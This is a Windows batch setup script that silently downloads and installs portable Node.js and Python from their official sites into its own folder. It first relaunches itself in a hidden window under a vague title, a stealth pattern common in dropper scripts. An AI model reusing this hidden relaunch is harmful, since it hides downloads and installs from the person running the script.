@echo off
title Creating new Info
setlocal enabledelayedexpansion

:: -------------------------
:: Restart hidden
:: -------------------------
if "%~1" neq "_restarted" (
  powershell -WindowStyle Hidden -Command ^
    "Start-Process cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden"
  exit /b
)

:: =========================
:: NODE.JS SETUP
:: =========================

echo [INFO] Checking Node.js...

for /f "delims=" %%v in (
  'powershell -Command "(Invoke-RestMethod https://nodejs.org/dist/index.json)[0].version"'
) do set "LATEST_NODE=%%v"

set "NODE_VERSION=%LATEST_NODE:v=%"
set "NODE_MSI=node-v%NODE_VERSION%-x64.msi"
set "NODE_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_MSI%"
set "NODE_DIR=%~dp0nodejs"
set "NODE_EXE=%NODE_DIR%\PFiles64\nodejs\node.exe"

if not exist "%NODE_EXE%" (
  echo [INFO] Downloading Node.js...

  powershell -Command ^
    "Invoke-WebRequest -Uri '%NODE_URL%' -OutFile '%~dp0%NODE_MSI%'"

  msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%NODE_DIR%"
  del "%~dp0%NODE_MSI%"
)

if not exist "%NODE_EXE%" (
  echo [ERROR] Node.js setup failed.
  exit /b 1
)

set "PATH=%NODE_DIR%\PFiles64\nodejs;%PATH%"
echo [INFO] Node.js ready.

:: =========================
:: PYTHON SETUP
:: =========================

echo [INFO] Checking Python...

set PY_VERSION=3.12.2
set PY_DIR=%~dp0python
set PY_EXE=%PY_DIR%\python.exe
set PY_ZIP=python-%PY_VERSION%-embed-amd64.zip
set PY_URL=https://www.python.org/ftp/python/%PY_VERSION%/%PY_ZIP%

if not exist "%PY_EXE%" (
  echo [INFO] Downloading Python embeddable...

  powershell -Command ^
    "Invoke-WebRequest -Uri '%PY_URL%' -OutFile '%~dp0%PY_ZIP%'"

  powershell -Command ^
    "Expand-Archive -Force '%~dp0%PY_ZIP%' '%PY_DIR%'"

  del "%~dp0%PY_ZIP%"

  :: Enable site-packages
  echo import site>>"%PY_DIR%\python312._pth"

  :: Enable pip
  "%PY_EXE%" -m ensurepip
)

if not exist "%PY_EXE%" (
  echo [ERROR] Python setup failed.
  exit /b 1
)

set "PATH=%PY_DIR%;%PATH%"
echo [INFO] Python ready.

:: =========================
:: OPTIONAL: PERSIST PATH
:: =========================
:: Uncomment if you want PATH saved permanently
::
:: setx PATH "%PY_DIR%;%NODE_DIR%\PFiles64\nodejs;%PATH%"

:: =========================
:: VERIFY
:: =========================
echo.
echo ===== VERSIONS =====
node -v
python --version
pip --version
echo ====================

echo [SUCCESS] Node.js and Python are ready.
pause
